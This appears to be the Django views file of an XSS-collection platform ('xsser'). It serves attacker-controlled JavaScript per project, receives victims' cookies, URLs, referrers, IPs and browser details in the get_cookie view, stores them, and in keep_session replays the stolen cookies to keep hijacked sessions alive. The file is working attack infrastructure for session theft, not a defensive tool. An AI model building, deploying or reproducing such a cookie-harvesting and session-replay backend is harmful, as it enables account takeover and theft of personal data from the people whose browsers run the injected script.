#coding=utf-8
import time
import json
import urllib2
import random
import hashlib
from django.core.paginator import Paginator
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required
from django.http import HttpResponse, Http404, HttpResponseRedirect, HttpResponseForbidden
from django.shortcuts import render, redirect, render_to_response
from xsser.settings import BASE_URL
from .models import XssProject, Record
from .js_content import js_content


@login_required(login_url="/login/")
def create_project(request):
    if request.method == "GET":
        return render(request, "core/create_project.html")
    else:
        title = request.POST.get("title")
        if not title:
            return HttpResponse("Please input title")
        if len(title) > 25:
            title = title[:25]
        project_id = hashlib.md5(unicode(random.uniform(1, 10) + time.time())).hexdigest()[:15]
        p = XssProject.objects.create(pk=project_id, user=request.user, title=title)
        return HttpResponseRedirect("/project?id=%s" % p.id)


@login_required(login_url="/login/")
def project_detail(request):
    project_id = request.GET.get("id", "-1")
    page_num = request.GET.get("p", "1")
    try:
        project = XssProject.objects.get(pk=project_id, user=request.user)
    except XssProject.DoesNotExist:
        raise Http404
    if "csrftoken" in request.COOKIES:
        token = request.COOKIES["csrftoken"]
    else:
        token = ""
    record_page_info = Paginator(project.records.all().order_by("-create_time"), 20)
    total_page = record_page_info.num_pages
    if int(page_num) > total_page:
        raise Http404
    have_pre = have_next = True
    if int(page_num) == 1:
        have_pre = False
    if int(page_num) == total_page:
        have_next = False
    return render(request, "core/project_detail.html", {"records": record_page_info.page(int(page_num)),
                                                        "project": project,
                                                        
                                                        "base_url": BASE_URL,
                                                        "token": token,
                                                        "page_num": page_num,
                                                        "have_next": have_next,
                                                        "have_pre": have_pre,
                                                        "next_page_num": unicode(int(page_num) + 1),
                                                        "pre_page_num": unicode(int(page_num) - 1), })


#TODO:获取ip等信息可能存在绕过
def get_cookie(request):
    project_id = request.GET.get("id", "-1")
    if "HTTP_X_FORWARDED_FOR" in request.META:
        ip = request.META['HTTP_X_FORWARDED_FOR']
    else:
        ip = request.META['REMOTE_ADDR']
    print request.GET.get("p")
    try:
        content = json.loads(request.GET.get("p", "{}"))
    except Exception:
        return HttpResponse("error")
        #print "error"
    #print content

    try:
        p = XssProject.objects.get(pk=project_id)
    except XssProject.DoesNotExist:
        raise Http404
    r = Record.objects.create(browser=content["browser"]["name"] + " " + content["browser"]["version"],
                              ip=ip,
                              user_agent=content["ua"],
                              language=content["lang"],
                              referer=content["referrer"],
                              location=content["location"],
                              top_location=content["toplocation"],
                              cookie=content["cookie"],
                              domain=content["domain"],
                              title=content["title"],
                              screen=content["screen"],
                              flash=content["flash"])

    p.records.add(r)
    p.save()
    return HttpResponse("success")


def xss_js(request):
    project_id = request.GET.get("id", "-1")
    try:
        p = XssProject.objects.get(pk=project_id)
    except XssProject.DoesNotExist:
        raise Http404
    if p.custom_js:
        js = p.custom_js_content
    else:
        js = js_content(p.id)
    return HttpResponse(js)


@login_required(login_url="/login/")
def my_projects(request):
    p = XssProject.objects.filter(user=request.user)
    return render(request, "core/my_project.html", {"projects": p})


@login_required(login_url="/login/")
def delete_project(request):
    project_id = request.GET.get("id", "-1")
    token = request.GET.get("token", " ")

    if "csrftoken" in request.COOKIES:
        if token == request.COOKIES["csrftoken"]:
            try:
                p = XssProject.objects.get(user=request.user, pk=project_id)
                p.records.all().delete()
                p.delete()
                return HttpResponse("success")
            except XssProject.DoesNotExist:
                raise Http404
    return HttpResponseForbidden("Invalid Token")


@login_required(login_url="/login/")
def delete_record(request):
    project_id = request.GET.get("project_id", "-1")
    record_id = request.GET.get("record_id", "-1")
    token = request.GET.get("token", "-1")
    print token
    print request.COOKIES["csrftoken"]
    if "csrftoken" in request.COOKIES:
        if token == request.COOKIES["csrftoken"]:
            try:
                p = XssProject.objects.get(pk=project_id, user=request.user)
                p.records.all().filter(id=record_id).delete()
                return HttpResponse("success")
            except XssProject.DoesNotExist:
                raise Http404
    return HttpResponseForbidden("Invalid Token")


@login_required(login_url="/login/")
def project_settings(request, project_id):
    try:
        p = XssProject.objects.get(pk=project_id, user=request.user)
    except XssProject.DoesNotExist:
        raise Http404
    if request.method == "GET":
        return render(request, "core/project_settings.html", {"project": p})
    else:
        checkbox_list = request.POST.getlist("settings")
        if "custom_js" in checkbox_list:
            p.custom_js = True
            p.custom_js_content = request.POST.get("custom_js_content")
            print p.custom_js_content
        else:
            p.custom_js = False
        if "keep_session" in checkbox_list:
            p.keep_session = True
        else:
            p.keep_session = False

        p.save()
        return HttpResponseRedirect("/project/settings/%s/" % p.id)


def func_test(request):
    response = render_to_response("core/func_test.html", {})
    response.set_cookie("test_cookie", "'1234567&&%")
    return response


#演示功能  还不能用~
def keep_session(request):
    p = XssProject.objects.filter(keep_session=True)
    for item in p:
        for record in item.records.all():
            try:
                req = urllib2.Request(record.url)
                req.add_header("cookie", record.cookie)
                response = urllib2.urlopen(req)
                #print response.read()
            except urllib2.URLError:
                pass

    return HttpResponse("success")




